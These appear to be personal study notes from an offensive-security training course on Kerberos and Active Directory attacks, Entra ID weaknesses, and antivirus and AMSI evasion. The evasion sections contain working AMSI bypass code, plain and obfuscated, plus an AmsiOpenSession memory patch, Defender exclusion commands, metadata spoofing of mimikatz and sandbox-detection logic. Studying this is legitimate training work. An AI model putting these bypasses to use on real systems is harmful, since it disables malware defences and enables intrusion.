---
tags:
  - trainings
  - blackhat
category:
---
![[Screenshot 2026-08-03 114551.png]]# Identity Attack Surface 

![[Pasted image 20260803112922.png]]

## MitM with Evilginx

![[Pasted image 20260803113113.png]]

## Phishing with Device Codes

![[Screenshot 2026-08-03 113231.png]]

# Microsoft Kerberos

## Attack Vectors

* Kerberoasting
* AS_REP Roasting
* Delegation
	* Constrained / Unconstrained
	* Resource based constrained
* Shadow Credentials
* SPN-Jacking
* Pass the certificate
* Cross-Domain Abuse

## User Enumeration

When requesting a kerberos ticket for a user there are three responses that can tell us if the user exists or not

* Does not exist - KDC_ERR_C_PRINCIPAL_UNKNOWN
* Locked or Disabled - KDC_ERR_CLIENT_REVOKED
* Valid Account - KDC_ERR_PREAUTH_REQUIRED

Detection measures
`All attempts are registered with Event ID 4768`

**Historically allowed user/domain enumeration**
* DsrGetDcNameEx2
* CLDAP (Connectionless LDAP) Ping
	* UDP packet (fast)
	* Response codes indicate existence of account - 23 (true) or 25 (false)
* NetBIOS MailSlot Ping
	* Response codes indicate existence of account - 23 (true) or 25 (false)

# Active Directory

## Core Components

**Domains**
* Trees and individual domains, users, computers, and group policies
**Trees**
* A logical construct to group one or more domains
**Forest**
* A collection of domains and domain trees
* All trees in a forest share a common schema, global catalog, and configuration
**Trust**
* A relationship established between the above

### SIDs and RIDs

**Unique and assigned sequentially by the local system**

![[Screenshot 2026-08-03 114551 1.png]]

### Delegation

**What can be delegated**
* Read user information
* Create/manage users
* Create/manage groups
* Modify group membership
* Reset passwords
* Much more through custom assignments

**Custom tasks/permission assignments can be extremely fine grained, allowing for very specific delegation requirements**

### Active Directory Trusts

**Unidirectional**
* One-Way Inbound Trust: Users in the trusting (local) forest can access resources in the trusted (external) forest, but not vice versa
* One-Way Outbound Trust: Users in the trusted forest can access resources in the local forest, but not vice versa
**Bidirectional**
* Two-Way Trust: Users in both forests can access resources in either forest

**Parent-child trust**
A two-way transitive trust is established with its parent whenever a new domain is created in a tree

**Tree-root trust:** 
A tree-root trust (two-way transitive) is established when a new domain tree is added to a forest

**Shortcut Trusts:** 
A one-way or two-way transitive trust between the child domains

**External Trusts:** 
A one-way or two-way nontransitive trust between Active Directory domains that are in different forests

**Realm Trusts:**  
A one-way or two-way trust between a non-Windows Kerberos realm, by default nontransitive but can be made transitive

**Forest Trusts:** 
A transitive trust between a forest-root-domain in one forest and a forest-root-domain in another forest, can be one-way or two-way

#### Kerberos Across Trusts

1. User authenticates with KDC
2. On success the KDC issues a TGT
3. The TGT is used to request a service ticket
4. KDC issues a TGT enc w/inter-realm TGT
5. KDC(2) issues a TGS
6. TGS ticket used to authenticate to service

![[Pasted image 20260803120358.png]]

## PowerShell Management Modules

| Module                                                          | Description                                            |
| --------------------------------------------------------------- | ------------------------------------------------------ |
| $Env:ADPS_LoadDefaultDrive = 0<br>Import-Module ActiveDirectory | Load Active Directory module and disable default drive |
| Get-ADUser                                                      | Information on a specific domain user                  |
| Get-ADGroup                                                     | Information on a specific group                        |
| Get-ADGroupMember                                               | Get group membership details                           |
| Get-ADPrincipalGroupMemberShip                                  | Get group membership details for a given user          |
| New-ADUser                                                      | Create a new domain user                               |
| Add-ADGroupMember                                               | Add user to specified group                            |
| Get-ADObject                                                    | Performs search to get multiple objects                |
| Get-ADForest                                                    | Information about forest details                       |

### References

[Windows Remote Administration Toolkit](https://www.microsoft.com/en-gb/download/details.aspx?id=45520)
[ADACL Scanner](https://github.com/canix1/ADACLScanner)
[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon)
[Delegation Hunter](https://github.com/NotSoSecure/AD_delegation_hunting)
[Delegation Blog by NotSoSecure](https://notsosecure.com/hunting-delegation-access)

# AAD // Azure Entra ID

**Identity & authentication platform**
**Consider it like a managed AD**
**Multiple roles and capabilities**
**Can connect to external entities**
**Can sync with On-Prem AD**

## Single Sign-On

**Single Sign-On can be combined with either PHS or PTA**
* Password hash synchronization
* Pass-Through Authentication
**An on-prem AD user session is seamlessly extended to AAD**
**Uses Kerberos with on-prem AD behind the scenes to get service ticket and authenticate with AAD**
**Imports some well-known Kerberos weaknesses into your AAD environment**

### Password Hash Synchronization

![[Pasted image 20260803121911.png]]

**User account details are uploaded to the AAD**
* Including password hashes

### Pass-Through Authentication

**Forwards auth requests onto on-prem AD**

![[Pasted image 20260803122034.png]]

**AAD Connect must run with high privileges to access hashes within AD**
**Compromise of on-prem AD connect server == compromise of AAD**
**A threat can leverage hash synchronization to takeover account that exists in AAD but not on-prem AD**

## Service Principles

**A default Office365 environment contains ~200**
**MFA can't be enabled for service principles**

**Application permissions are either**
* Delegated - obtained from the user signed in
* Assigned to the application service principle

**By default any user can**
* Create applications
* Create service principles

**When an application service principle is granted permissions**
* The principle that owns the application can impersonate the service principal
* This includes RBAC roles
* Actions will appear in logs as though performed by the application

## Admin Account Roles

**Global / Company Admin accounts can do anything, but some limited admin account roles also exist**
* Application Administrator
* Authentication Administrator
* Exchange Administrator

## Enumeration

**Any low privileged account can**
* Query user & role members through On-prem or azure portals
* Even when Office 365 is the only access
	* User is automatically part of Azure AD
	* Able to interact with azure-cli

**URLS**
* GUI to active directory: https://portal.azure.com
* Third-party apps list: https://myapps.microsoft.com

# Account Controls

## AppLocker

# Defense Evasion

## AMSI

> AMSI is antimalware vendor agnostic, designed to allow for the most common malware scanning and protection techniques provided by today's antimalware products that can be integrated into applications. It supports a calling structure allowing for file and memory or stream scanning, content source URL/IP reputation checks, and other techniques

### AMSI Architecture Simplified

![[Pasted image 20260803135425.png]]

### AMSI Result


| Result                             | Description                                                                                                     |
| ---------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| AMSI_RESULT_CLEAN                  | Known good. No detection found, and the result is likely not going to change after a future definition upgrade. |
| AMSI_RESULT_NOT_DETECTED           | No detection found, but the result might change after a future definition upgrade.                              |
| AMSI_RESULT_BLOCKED_BY_ADMIN_START | Administrator policy blocked this content on this machine (beginning of range)                                  |
| AMS_RESULT_BLOCKED_BY_ADMIN_END    | Administrator policy blocked this content on this machine (end of range)                                        |
| AMSI_RESULT_DETECTED               | Detection found. The content is considered malware and should be blocked                                        |

### AMSI Limitations

**Signature-based detection, easily bypassed by**
* String manipulation
* Obfuscation
* Encoding
**Hit or miss, depending on the AV vendor's signature**
* Invoke-Obfuscation.ps1
* amsi.fail

### AMSI Signature Evasion

**PowerShell find code signature with [AmsiTrigger](https://github.com/RythmStick/AMSITrigger)**
* Manually adjust the code to bypass signature-based threat detection mechanisms

### AMSI Tampering

AMSI is loaded into the address space of the threat-created process
Each component can be tampered with to break the chain

![[Pasted image 20260803140216.png]]

> [!INFO] Tampering differs based on consumer application


#### AMSI Init Failed

**Force set `amsiInitFailed` to True**

*AMSI Function*
```powershell
if (AmsiUtils.amsiInitFailed)
{
    result = AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
}
```

*AMSI Bypass*
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null, $true)
```

*Obfuscated AMSI Bypass*
```powershell
$bu = $null;$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils';
$assmbly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m));
$field = $assmbly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');
$field.SetValue($bu,$true);
```

#### AMSI.dll

**Code patch function**
* AmsiOpenSession()
* AmsiScanBuffer()

Alternate ways to locate functions: `Function Offsets` & `Egg Hunter`
**Drawback:** Detected by scanners looking for amsi.dll code patches at runtime

*Patching AmsiOpenSession*
![[Pasted image 20260803140913.png]]

Find the offset of address to be patched → Convert from Hex to Decimal

![[Pasted image 20260803141047.png]]

This below code is patching a byte at `AmsiOpenSession+16` (flipping a conditional jump, `0x74`→`0x75` or similar patch pattern) to neuter AMSI at the memory-patch level

```powershell
$data = @"
...

IntPtr lib = LoadLibrary("a"+"m"+"si."+"dll");
IntPtr amsiopensession = GetProcAddress(lib, "Am"+"s"+"iOpen"+"S"+"ession");
IntPtr final = new IntPtr(amsiopensession.ToInt64() + 16);
uint old = 0;
VirtualProtect(final, (UInt32)0x1, 0x40, out old);
Console.WriteLine(old);
byte[] patch = new byte[] { 0x74 };
Marshal.Copy(patch, 0, final, 1);
VirtualProtect(final, (UInt32)0x1, old, out old);
"@

Add-Type $data -Language CSharp
[Program]::Run()
```

https://www.pentestpartners.com/security-blog/patchless-amsi-bypass-using-sharpblock/
https://github.com/CCob/SharpBlock

## AV Evasion

### Development

**Consideration when Choosing a Language**
* Which language provides the most utility to get the end-goal required
* High vs. Low level vs. Interpreted vs. Compiled
* Cross-compilation
* Binary size
* Obfuscation
* Documentation & Ease of use

![[Pasted image 20260803160844.png]]

### Situational Awareness

* What privileges do we have
* What security solutions are on the endpoint
* Are there any exclusions we can leverage
* What network-level restrictions are in place
* How can we blend in with the environment

**Check for**
* Environment variables
* Running processes & Services
* Drivers
* Installation Directories

**AV Exclusions**
* Identify exclusions (requires local admin)
```powershell
$Exclusions = Get-MPPreference
$Exclusions.ExclusionPath
```

* Create an exclusion
```powershell
# Powershell
Add-MPPreference -ExclusionPath "<path>"

# Powershell Core
pwsh Add-MpPreference -ExclusionExtension ".hta"
```

### Static Analysis

![[Pasted image 20260803161747.png]]

### Windows API Primer

* Allows us to interact with the OS
	* Display content on screen
	* Get input from mouse and keyboard
	* Read/Write files
* Exported by kernel32.dll, user32.dll, etc.
* Often just a wrapper for Native APIs

Native APIs Functions that perform the actual operation
* Distinguishable by Nt or Zw prefix
* Useful for AV/EDR Evasion
* Exported by ntdll.dll
* Unofficial doc by ReactOS - https://doxygen.reactos.org/index.html

![[Pasted image 20260803162008.png]]

Windows API call flow
![[Pasted image 20260803162021.png]]

### WOW64

`W`indows 32 bit `O`n `W`indows `64`-bit
x86 emulator that allows 32-bit Windows-based applications to run seamlessly on 64-bit Windows
32-bit processes cannot load 64-bit DLLs, and 64-bit processes cannot load 32-bit DLLs for execution

**DllImport** - Allows CLR call the function defined in the DLL specified in the first argument
**extern** - Function is defined in external assembly
**VirtualAlloc** - Should be the same as defined in the DLL

Hide OpenProcess from ImplMap table

`Marshal.GetDelegateForFunctionPointer` Converts an unmanaged function pointer to a delegate

Dynamically resolve functions
	`lib = LoadLibrary("kernel32.dll")`
	`GetProcAddress(lib, "OpenProcess")`

## Entropy and Payload Obfuscation

**Problems:**
* Hard-coded strings could be an indicator
* What about the shellcode itself
* Do we encrypt or obfuscate

### Entropy

* Measure of randomness
* Encrypted shellcode -> More random -> Higher entropy
* Used by AV as a static indicator
* Packed malware >=7 `sigcheck.exe -h -a malware.exe`

![[Pasted image 20260803162935.png]]
![[Pasted image 20260803162946.png]]
https://github.com/RedSiege/jargon

![[Pasted image 20260803163114.png]]

### Code Signing

**Stole or Fraudulent Certificates**
* Attackers may acquire stolen or fraudulently obtained digital certificates and use them to sign their malware
**Certificate Chain Hijacking**
* Attackers my compromise the certificate chain by compromising a CA or an intermediate certificate authority
* By obtaining control over the certificate chain, they can sign their malware with trusted certificates that will not trigger AV detections
**Expired or Revoke Certificates**
* Attackers may use digital certificates that have expired or have been revoked by the certificate authority
**Certificate Spoofing**
* Attackers may create fake certificates that mimic legitimate ones. These fake certificates can be used to sign the malware and make it appear as if it is signed by a trusted entity

`Sigthief`: Extract digital signature of a signed PE
`Limelighter`: Fake code signing, using Domain SSL cert

### Metadata

* Blank values appear suspicious
* Modify the `Data modified` value
* Blend in with the environment
* Useful to confuse analysts

Spoof file attributes
https://github.com/threatexpress/metatwin

```powershell
Invoke-MetaTwin -Source c:\windows\system32\PickerHost.exe -Target .\mimikatz.exe
```

### Dynamic Analysis

![[Pasted image 20260803163900.png]]

```powershell
//Check if target process is running
Process[] pArray = Process.GetProcessesByName(“slack");
if (pArray.Length > 0)
{
//Execute code
}

//Check for domain name
WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent();
if (windowsIdentity.Name.IndexOf(“NORTHWIND") != -1)
{
//Execute code
}

// Sandbox Alert! Sleep for 1h and exit!
Else
{
System.Threading.Thread.Sleep(3600 * 1000);
System.Environment.Exit(0);
}
```

### Heuristics

![[Pasted image 20260803164050.png]]

